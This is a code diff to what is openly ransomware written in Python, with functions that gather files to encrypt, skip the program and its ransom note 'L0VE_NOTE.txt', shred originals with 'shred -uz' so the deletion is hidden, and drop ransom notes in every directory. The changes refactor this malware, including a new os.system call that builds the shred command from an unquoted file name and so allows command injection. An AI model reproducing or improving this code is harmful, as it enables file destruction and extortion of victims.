@@ -1,6 +1,6 @@
 import os
 import sys
-import subprocess
+
 from tqdm import tqdm  # Progress bar
 
 
@@ -16,9 +16,9 @@ def recursive_walk(paths, target_extensions, mode):
     """
 
     file_list = []
-    for path in paths:
+    for path in tqdm(paths, smoothing=0.5, desc="Gathering files...."):
         # root=path, _=subdirectories, files=files of any type
-        for root, _, files in tqdm(os.walk(path), smoothing=0.5, desc="Gathering files...."):
+        for root, _, files in os.walk(path):
             for file in files:
                 if file not in [sys.argv[0], "L0VE_NOTE.txt"]:  # Don't encrypt self or ransom note
                     abs_path = os.path.join(root, file)         # Get the files absolute path
@@ -34,7 +34,9 @@ def recursive_walk(paths, target_extensions, mode):
 
 def secure_delete(filename):
     """
-    Securely delete file. Try using shred, if it doesnt exist perform a manual 3 pass overwrite using os
+    Securely delete file. Try running shred in a subprocess, if it doesnt exist
+    perform a manual 3 pass overwrite using os
+
     :param filename:  absolute path of file to delete
     """
 
@@ -43,8 +45,8 @@ def secure_delete(filename):
 
     try:
         # -u deletes file after complete, -z zeroes the file at the end, hiding that it was shredded
-        subprocess.run(["shred", "-uz", filename])
-    except OSError:
+        os.system("shred -uz {} >/dev/null 2>&1".format(filename))
+    except (FileNotFoundError, OSError, BlockingIOError):
         f = None
         try:
             f = open(filename, "ab+")
@@ -76,7 +78,7 @@ def create_chunks(array, n):
 
 def leave_notes(note, paths):
     """
-    Leave a note in each path
+    Drop a note in each path
 
     :param note:   String to write to each directory after encryption is complete
     :param paths:  Array of paths to walk
